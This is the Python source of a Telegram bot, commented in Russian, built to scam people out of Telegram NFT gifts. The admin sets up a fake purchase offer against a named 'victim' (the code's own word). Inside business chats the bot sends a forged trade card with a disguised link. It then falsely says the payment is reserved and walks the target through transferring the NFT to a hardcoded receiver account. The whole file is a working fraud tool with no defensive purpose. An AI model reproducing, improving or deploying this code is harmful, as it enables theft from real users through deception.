import os
import re
import uuid
import asyncio
import logging
import sys
import time
from aiogram import Bot, Dispatcher, F, Router
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.filters import Command
from aiogram.types import (Message, CallbackQuery, InlineKeyboardButton,
                           InlineKeyboardMarkup, BusinessConnection)
from dotenv import load_dotenv

load_dotenv()
logging.basicConfig(level=logging.INFO, stream=sys.stdout)
log = logging.getLogger("offerbot")

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))
RECEIVER = os.getenv("RECEIVER_USERNAME", "vo1d_root")

bot = Bot(BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()
router = Router()
dp.include_router(router)

OFFERS = {}

NFT_RE = re.compile(r"https?://t\.me/nft/([A-Za-z0-9_-]+)", re.I)
PRICE_RE = re.compile(r"(\d+)\s*(gram|грам|звезд|star|stars|⭐|grams)", re.I)
CODE_RE = re.compile(r"(of_[a-f0-9]{5})", re.I)

def parse_nft(url: str):
    m = NFT_RE.search(url)
    if not m: return None
    slug_raw = m.group(1)
    parts = slug_raw.rsplit("-", 1)
    name_raw, num = (parts[0], parts[1]) if len(parts) == 2 and parts[1].isdigit() else (slug_raw, "")
    display = re.sub(r"(?<!^)(?=[A-Z])", " ", name_raw).strip()
    return {"slug": slug_raw, "name": f"{display} #{num}" if num else display}

def parse_price(text: str):
    m = PRICE_RE.search(text)
    if not m: return None
    amount, unit = m.group(1), m.group(2).lower()
    if unit in ("gram", "грам", "grams"):
        return (amount, "Gram")
    return (amount, "Stars")

# ==========================================
# ЛИЧКА БОТА (Создание оффера)
# ==========================================
@router.message(Command("start"))
async def cmd_start(msg: Message):
    if msg.from_user.id != ADMIN_ID: return
    await msg.reply(
        "🤖 <b>Бот готов!</b>\n\n"
        "Формат: <code>/купить [ссылка] [цена] [@username]</code>\n"
        "Пример: <code>/купить https://t.me/nft/MirageLamp-73768 155 GRAM @target</code>"
    )

@router.message(F.text.regexp(r"^/купить\s+"))
async def cmd_buy(msg: Message):
    if msg.from_user.id != ADMIN_ID: return

    parts = msg.text.replace("/купить", "").strip().split()
    if len(parts) < 3:
        await msg.reply("❌ Формат: <code>/купить [ссылка] [цена] [@username]</code>")
        return

    url = parts[0]
    target_user = parts[-1] if parts[-1].startswith("@") else "unknown"
    price_text = " ".join(parts[1:-1]) if target_user != "unknown" else " ".join(parts[1:])

    nft = parse_nft(url)
    price_data = parse_price(price_text)

    if not nft or not price_data:
        await msg.reply("❌ Не понял ссылку или цену.")
        return

    oid = "of_" + uuid.uuid4().hex[:5]
    
    OFFERS[oid] = {
        "nft_name": nft["name"],
        "nft_slug": nft["slug"],
        "price_amount": price_data[0],
        "price_currency": price_data[1],
        "buyer": msg.from_user.username or "buyer",
        "target_user": target_user,
        "expires": int(time.time()) + 6*3600
    }

    await msg.reply(
        f"✅ <b>Оффер создан!</b>\n\n"
        f"Подарок: {nft['name']}\n"
        f"Цена: {price_data[0]} {price_data[1]}\n"
        f"Жертва: {target_user}\n\n"
        f"Код: <code>{oid}</code>\n"
        f"Отправь его в чат с жертвой."
    )

# ==========================================
# BUSINESS-ЧАТ (Отправка карточки)
# ==========================================
@router.business_message(F.text)
async def handle_business_message(msg: Message):
    if msg.from_user and msg.from_user.id != ADMIN_ID: return

    m = CODE_RE.search(msg.text)
    if not m: return

    oid = m.group(1).lower()
    offer = OFFERS.get(oid)
    if not offer: return

    conn_id = msg.business_connection_id
    if not conn_id: return

    # Форматируем цену
    if offer["price_currency"] == "Stars":
        price_str = f"{offer['price_amount']} ⭐️"
    else:
        price_str = f"{offer['price_amount']} Gram"

    target_user = msg.from_user.username or "buyer"
    
    # МАСКИРОВКА ССЫЛКИ:
    # Ссылка спрятана в самом низу текста, чтобы Telegram подтянул превью вниз.
    # Внешне она выглядит просто как название подарка, но кликабельна.
    nft_link = f'<a href="https://t.me/nft/{offer["nft_slug"]}">{offer["nft_name"]}</a>'

    card_text = (
        f"Пользователь <b>{target_user}</b> предлагает обменять ваш {nft_link} на <b>{price_str}</b>.\n\n"
        f"Вы согласны принять предложение?\n\n"
        f"Предложение действует ещё <b>6ч 0м</b>.\n\n"
        f"{nft_link}" # <--- Ссылка в конце, чтобы превью было снизу
    )

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Отклонить", callback_data=f"reject:{oid}"),
         InlineKeyboardButton(text="Принять", callback_data=f"accept1:{oid}")]
    ])
    
    try:
        await bot.send_message(
            chat_id=msg.chat.id, 
            text=card_text, 
            business_connection_id=conn_id,
            reply_markup=kb, 
            disable_web_page_preview=False # <--- ВКЛЮЧАЕМ превью, чтобы карточка была
        )
        await asyncio.sleep(0.5)
        try: await bot.delete_message(chat_id=msg.chat.id, message_id=msg.message_id)
        except: pass
    except Exception as e:
        log.error(f"❌ Ошибка: {e}")

# ==========================================
# ЛОГИКА КНОПОК
# ==========================================
@router.callback_query(F.data.startswith("accept1:"))
async def on_accept1(cb: CallbackQuery):
    oid = cb.data.split(":", 1)[1]
    offer = OFFERS.get(oid)
    if not offer: return
    
    if offer["price_currency"] == "Stars":
        price_str = f"{offer['price_amount']} ⭐️"
    else:
        price_str = f"{offer['price_amount']} Gram"

    text = (
        f"<b>Сумма {price_str} зарезервирована.</b>\n\n"
        f"Чтобы завершить сделку:\n"
        f"1. Ознакомьтесь с инструкцией ниже.\n"
        f"2. Нажмите «Передать NFT»."
    )
    
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Передать NFT", callback_data=f"accept2:{oid}")]
    ])
    
    await cb.message.edit_text(text=text, reply_markup=kb)
    await cb.answer()

@router.callback_query(F.data.startswith("accept2:"))
async def on_accept2(cb: CallbackQuery):
    oid = cb.data.split(":", 1)[1]
    offer = OFFERS.get(oid)
    
    native_transfer_url = f"tg://send_gift?slug={offer['nft_slug']}"
    
    text = (
        f"<b>Инструкция по передаче:</b>\n\n"
        f"1. Нажмите на кнопку ниже\n"
        f"2. Выберите «Передать NFT»\n"
        f"3. Укажите получателя: <b>@{RECEIVER}</b>\n"
        f"4. Подтвердите.\n\n"
        f"👇 Меню передачи откроется автоматически:"
    )
    
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Передать NFT ↗", url=native_transfer_url)]
    ])
    
    await cb.message.edit_text(text=text, reply_markup=kb)
    await cb.answer()

@router.callback_query(F.data.startswith("reject:"))
async def on_reject(cb: CallbackQuery):
    try: await cb.message.edit_reply_markup(reply_markup=None)
    except: pass
    await cb.answer("Вы отклонили предложение.")

@router.business_connection()
async def on_business_conn(conn: BusinessConnection):
    log.info(f"✅ Business connection: user={conn.user.id} id={conn.id}")

async def main():
    log.info("Starting bot...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
